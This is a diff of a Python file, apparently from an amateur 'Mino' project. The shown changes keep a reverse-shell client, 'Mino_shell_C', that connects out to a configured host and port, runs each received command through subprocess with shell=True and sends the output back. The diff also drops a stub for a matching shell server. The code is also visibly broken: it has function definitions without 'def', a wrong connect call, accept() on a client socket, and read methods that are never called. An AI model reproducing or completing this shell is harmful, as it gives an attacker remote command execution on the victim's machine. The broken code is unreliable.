@@ -45,14 +45,8 @@ def Mino_web_engine_login():
 
 Mino_web_engine_login()
 
-'''
-Mino_shell_S(): 
-  
-   #start here
-
-Mino_shell_S()         \
-                         ---- Both are partially done. One needs something in it while the other needs to be tested
-Mino_shell_C():        /
+'''            
+Mino_shell_C():        <- This function serves as a client. Server is not necessary
     
     with socket.socket(AF_INET, SOCK_STREAM) as s:
          s.connect(Host, Port)
@@ -60,14 +54,13 @@ Mino_shell_C():        /
          conn, addr = s.accept()
             
          while True:
-             tk = s.recv(1024)
-             
+             tk = s.recv(1024)             
              if 'kill' in tk:
                 s.close()
                 break
                 
              else:
-                SP = subprocess.Popen(tk, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                SP = subprocess.Popen(tk, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                 s.send(SP.stdout.read)
                 s.send(SP.stderr.read)
                 
